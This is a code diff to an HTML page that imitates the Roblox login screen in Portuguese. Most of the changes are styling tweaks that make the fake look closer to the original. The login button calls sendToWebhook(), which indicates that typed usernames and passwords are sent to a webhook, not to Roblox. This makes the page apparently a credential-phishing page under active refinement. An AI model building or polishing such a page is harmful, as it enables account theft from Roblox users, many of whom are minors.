@@ -18,7 +18,6 @@
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* BARRA SUPERIOR - AJUSTADA PARA 52PX (PADRÃO ORIGINAL) */
         .roblox-header {
             width: 100%; height: 52px; background: #232527;
             display: flex; align-items: center; 
@@ -35,7 +34,6 @@
 
         .header-nav { display: flex; align-items: center; gap: 20px; color: #fff; font-size: 15px; font-weight: 500; flex-grow: 1; }
         
-        /* BARRA DE PESQUISA - MAIS LARGA E ALINHADA */
         .search-bar { position: relative; flex-grow: 1; max-width: 520px; margin: 0 10px; }
         .search-bar input {
             width: 100%; height: 32px; background: rgba(25, 27, 29, 0.8); border: 1px solid #454749;
@@ -48,33 +46,40 @@
             background-size: contain; background-repeat: no-repeat;
         }
 
-        /* CAIXA DE LOGIN - CENTRALIZADA */
         .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 52px; }
         
         .login-box {
             background-color: #393b3d; padding: 40px 30px; border-radius: 8px;
-            width: 90%; max-width: 400px; text-align: center;
+            width: 90%; max-width: 420px; text-align: center;
             box-shadow: 0 4px 20px rgba(0,0,0,0.6); z-index: 2; box-sizing: border-box;
         }
 
         h1 { color: #fff; font-size: 28px; margin-bottom: 25px; font-weight: 700; letter-spacing: -1.2px; }
         
+        /* INPUTS - AJUSTADOS PARA 48PX DE ALTURA */
         input {
-            width: 100%; height: 45px; background-color: #191b1d; border: 1px solid #454749;
-            border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 15px;
+            width: 100%; height: 48px; background-color: #191b1d; border: 1px solid #454749;
+            border-radius: 4px; color: #fff; padding: 0 15px; margin-bottom: 12px;
             box-sizing: border-box; font-size: 16px; outline: none;
         }
 
+        /* BOTÃO ENTRAR - AJUSTADO PARA 42PX DE ALTURA */
         .btn-entrar {
-            width: 100%; height: 40px; background-color: transparent; border: 1.5px solid #bdbebe;
+            width: 100%; height: 42px; background-color: transparent; border: 1.5px solid #bdbebe;
             color: #fff; border-radius: 4px; font-size: 17px; cursor: pointer; margin-bottom: 20px;
             font-weight: 600;
         }
 
+        /* BOTÃO SECUNDÁRIO - AJUSTADO PARA 48PX DE ALTURA */
         .btn-secondary {
-            width: 100%; height: 45px; background-color: #4f5153; border: none;
+            width: 100%; height: 48px; background-color: #4f5153; border: none;
             color: #fff; border-radius: 4px; font-size: 14px; margin-bottom: 12px; cursor: pointer;
         }
+
+        .forgot-link {
+            color: #fff; text-decoration: none; font-size: 14px; display: block; margin-bottom: 25px;
+        }
+        .forgot-link:hover { text-decoration: underline; }
 
         .footer-classificacao { position: fixed; bottom: 15px; width: 100%; text-align: center; color: #fff; }
     </style>
@@ -103,12 +108,12 @@
 <div class="container">
     <div class="login-box">
         <h1>Entrar na Roblox</h1>
-        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off">
+        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off" spellcheck="false">
         <input type="password" id="pass" placeholder="Senha" autocomplete="off">
         <button class="btn-entrar" onclick="sendToWebhook()">Entrar</button>
-        <a href="#" style="color:#fff; text-decoration:none; font-size:13px; display:block; margin-bottom:20px;">Esqueceu a senha ou nome de usuário?</a>
+        <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
         <button class="btn-secondary">Entrada rápida</button>
-        <p style="color: #fff; font-size: 14px; margin-top: 20px;">
+        <p style="color: #fff; font-size: 15px; margin-top: 30px;">
             Não possui uma conta? <span style="text-decoration: underline; cursor: pointer;">Cadastrar-se</span>
         </p>
     </div>
